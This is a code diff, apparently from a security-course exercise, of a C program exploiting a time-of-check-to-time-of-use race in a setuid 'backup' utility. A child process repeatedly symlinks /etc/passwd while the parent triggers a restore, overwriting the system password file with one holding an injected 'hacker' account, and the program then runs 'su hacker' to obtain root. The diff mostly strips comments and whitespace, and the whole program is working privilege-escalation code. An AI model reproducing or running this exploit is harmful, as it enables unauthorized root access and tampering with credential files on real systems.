@@ -26,17 +26,10 @@ int main(int argc, char **argv)
 	char *args[4];
 	char *env[1];
 
-	/*First we fill payload buffer with the address of the target (buffer address)*/
 	int i, j;
 	int pid;
-	
 	int exitTOCTTOU;
 
-	/*Store addresses 0xffbfdccc and 0xffbfdcce onto the stack
-	  These are the lower and upper 2 bytes of the RET address location we are trying to overwrite
-	*/
-
-	
 	//Creates a password file with appended "hacker" entry in second line
 	remove("passwd");	
 	createPasswdFile();
@@ -44,15 +37,13 @@ int main(int argc, char **argv)
 	//Start backup
 	args[0] = TARGET;
 	args[1] = "backup";
-	
-	args[2] = "passwd"; args[3] = NULL;
+	args[2] = "passwd"; 
+	args[3] = NULL;
 	env[0] = NULL;
 
 	system("/usr/local/bin/backup backup passwd");
 	
-	
 	//TTOCTU exploit starts here
-	
 	args[1] = "restore";
 	args[2] = "passwd";
 	
@@ -65,38 +56,33 @@ int main(int argc, char **argv)
 			//Parent restores file
 			for(j = 0; j < NUM_ITERATION; ++ j)
 			{
-					system("/usr/local/bin/backup restore passwd");
+				system("/usr/local/bin/backup restore passwd");
 				remove("passwd");
 			}
 			
 			waitpid(pid, NULL, 0); //wait for child to create symlink
 			
-			
 			//wc -l gets number of lines of passwd file. 
 			//Original passwd file has 22 lines. If it is equal to 4 now, it means our "hacker" entry has been appended inside the file
-			// backquote means everything inside is evaluated
-			
+			//backquote means everything inside is evaluated
 			exitTOCTTOU = system("[ `wc -l /etc/passwd | cut -d ' ' -f1` -eq 4 ] && exit 1 || exit 0");
 			
 			if (WEXITSTATUS(exitTOCTTOU) == 1) break;
 		}
 		else if (pid == 0) //Child
 		{
-		
 			for(j = 0; j < NUM_ITERATION; ++ j)
 			{
 				usleep(800);
 				symlink("/etc/passwd", "passwd");
 			}
 			return 0;
-			
 		}
 		else
 		{
 			puts("Error forking\n");
 		}
 	}
-	
 	//Should get root access here. Login to hacker
 	system("su hacker");
 }
